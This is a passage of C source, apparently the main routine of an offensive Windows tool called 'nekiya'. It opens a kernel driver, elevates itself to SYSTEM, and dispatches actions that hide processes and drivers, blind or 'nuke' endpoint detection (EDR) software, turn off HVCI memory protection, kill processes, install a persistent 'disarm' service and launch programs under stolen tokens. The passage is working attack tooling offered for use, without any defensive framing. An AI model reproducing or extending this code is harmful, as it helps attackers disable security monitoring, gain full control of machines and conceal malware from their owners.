            }
        }
    }
    {
        ft_sb f;
        ft_sb_init(&f);
        ft_sb_addf(&f, "\"build\":%u,\"dry_run\":%d,\"actions\":%d,\"sys\":\"%s\"",
                   ctx.build, ctx.dry_run, nact, ctx.sys_path);
        ft_info(&ctx, "start", f.buf);
        ft_sb_free(&f);
    }

    if (need_system && !ft_proc_is_system(&ctx)) {
        need_km = 1;
    }

    if (need_km) {
        if (!ft_km_open(&ctx)) {
            ft_err(&ctx, "km_unavailable",
                   "\"hint\":\"load msft.sys as SYSTEM or run elevated\"");
            ft_status_close(&ctx);
            return FT_E_KM;
        }
        rc = ft_proc_derive_layout(&ctx);
        if (rc != FT_OK) {
            ft_err(&ctx, "layout_failed", "\"rc\":%d", rc);
            ft_km_close(&ctx);
            ft_status_close(&ctx);
            return rc;
        }
    }

    if (need_system && !ctx.dry_run) {
        ft_enable_all_privileges(&ctx);
    }
    if (need_system && !ft_proc_is_system(&ctx)) {
        ft_info(&ctx, "prepare_elevating", "");
        rc = ft_elevate_self(&ctx);
        if (rc != FT_OK && !ctx.dry_run) {
            ft_err(&ctx, "prepare_elevation_failed", "\"rc\":%d", rc);
            ft_km_close(&ctx);
            ft_status_close(&ctx);
            return rc;
        }
    }

    if (edr_nullify) ft_edr_set_nullify(1);

    for (i = 0; i < nact; i++) {
        switch (acts[i].kind) {
        case ACT_HIDE_PID:
            acts[i].rc = ft_hide_process(&ctx, acts[i].pid);
            break;
        case ACT_HIDE_NAME: {
            uint32_t pid = 0;
            if (!ft_proc_find_by_name(&ctx, acts[i].str, &pid)) {
                ft_err(&ctx, "hide_name_notfound", "\"name\":\"%s\"", acts[i].str);
                acts[i].rc = FT_E_TARGET;
            } else {
                ft_info(&ctx, "hide_name_resolved", "\"name\":\"%s\",\"pid\":%u",
                        acts[i].str, pid);
                acts[i].rc = ft_hide_process(&ctx, pid);
            }
            break;
        }
        case ACT_HIDE_DRIVER:
            acts[i].rc = ft_hide_driver(&ctx, acts[i].str);
            break;
        case ACT_BLIND:
            if (!helper_out) {

                acts[i].rc = ft_run_privileged_action(&ctx, "blind");
            } else {
                acts[i].rc = ft_blind_run(&ctx, 0, keep_services);
            }
            if (nextra_kill > 0) {
                ft_kill_procs(&ctx, extra_kill, nextra_kill);
            }
            break;
        case ACT_NUKE:
            if (!helper_out) {
                acts[i].rc = ft_run_privileged_action(&ctx, "nuke");
            } else {
                acts[i].rc = ft_blind_run(&ctx, 1, keep_services);
            }
            if (nextra_kill > 0) {
                ft_kill_procs(&ctx, extra_kill, nextra_kill);
            }
            break;
        case ACT_ELEVATE_PID:
            acts[i].rc = (acts[i].pid == 0) ? ft_elevate_self(&ctx)
                                            : ft_elevate_pid(&ctx, acts[i].pid);
            break;
        case ACT_LAUNCH: {
            uint32_t child = 0;
            acts[i].rc = ft_launch_system(&ctx, acts[i].str, acts[i].argv,
                                          acts[i].visible, &child);
            break;
        }
        case ACT_LAUNCH_AS: {
            uint32_t child = 0;
            acts[i].rc = ft_launch_as_pid(&ctx, acts[i].pid, acts[i].str,
                                          acts[i].argv, acts[i].visible, &child);
            break;
        }
        case ACT_HVCI_OFF:
            acts[i].rc = ft_hvci_off(&ctx);
            break;
        case ACT_DISARM:
            acts[i].rc = ft_disarm_service_run(&ctx);
            if (acts[i].rc == FT_OK) ft_disarm_live(&ctx);
            break;
        case ACT_ARM:
            acts[i].rc = ft_install_disarm_service(&ctx);
            break;
        case ACT_KILL: {
            uint32_t num = 0;
            const char* a2 = acts[i].str ? acts[i].str : "";
            int all_digits = (*a2 != 0);
            const char* q = a2;
            for (; *q; q++) { if (*q < '0' || *q > '9') { all_digits = 0; break; } }
            if (all_digits) {
                num = (uint32_t)strtoul(a2, NULL, 10);
                acts[i].rc = ft_kill_pid(&ctx, num);
            } else {
                const char* one[1];
                one[0] = a2;
                acts[i].rc = ft_kill_procs(&ctx, one, 1);
            }
            break;
        }
        default:
            acts[i].rc = FT_E_ARGS;
        }
        if (acts[i].rc != FT_OK) {
            rc_final++;
        }
    }

    if (nextra_edr > 0) {
        rc = ft_edr_callbacks(&ctx, extra_edr, nextra_edr);
        if (rc != FT_OK) rc_final++;
    }

    {
        ft_sb f;
        ft_sb_init(&f);
        ft_sb_addf(&f, "\"actions\":%d,\"failed\":%d,\"warns\":%d,\"system\":%d",
                   nact, rc_final, ctx.warns, ft_proc_is_system(&ctx) ? 1 : 0);
        if (rc_final == 0) ft_ok(&ctx, "complete", f.buf);
        else ft_log(&ctx, "err", "complete_with_failures", f.buf);
        ft_sb_free(&f);
    }

    if (want_json || json_out) {
        ft_sb doc;
        int k;
        ft_sb_init(&doc);
        ft_sb_addf(&doc, "{\"tool\":\"nekiya\",\"dry_run\":%d,\"system\":%d,\"warns\":%d,\"rc\":%d,\"actions\":[",
                   ctx.dry_run, ft_proc_is_system(&ctx) ? 1 : 0, ctx.warns, rc_final);
        for (k = 0; k < nact; k++) {
            ft_sb_addf(&doc, "%s{\"kind\":\"%s\"", (k ? "," : ""), ft_act_name(acts[k].kind));
            switch (acts[k].kind) {
            case ACT_HIDE_PID:
            case ACT_ELEVATE_PID:
                ft_sb_addf(&doc, ",\"pid\":%u", acts[k].pid);
                break;
            case ACT_HIDE_NAME:
            case ACT_HIDE_DRIVER:
            case ACT_LAUNCH:
            case ACT_LAUNCH_AS:
                ft_sb_adds(&doc, ",\"arg\":");
                ft_sb_addj(&doc, acts[k].str ? acts[k].str : "");
                break;
            default:
                break;
            }
            ft_sb_addf(&doc, ",\"rc\":%d}", acts[k].rc);
        }
        ft_sb_adds(&doc, "]}");
        if (json_out) {
            FILE* jf = fopen(json_out, "w");
            if (jf) {
                fprintf(jf, "%s\n", doc.buf ? doc.buf : "{}");
                fclose(jf);
            } else {
                fprintf(stderr, "nekiya: cannot write %s\n", json_out);
            }
        }
        if (want_json) {
            printf("%s\n", doc.buf ? doc.buf : "{}");
        }
        ft_sb_free(&doc);
    }

    ft_revert_impersonation(&ctx);
    ft_revert_impersonation(&ctx);
    ft_km_close(&ctx);
    ft_status_close(&ctx);
    ft_sb_free(&ctx.json);

    return rc_final ? FT_E_ACTION : 0;
}
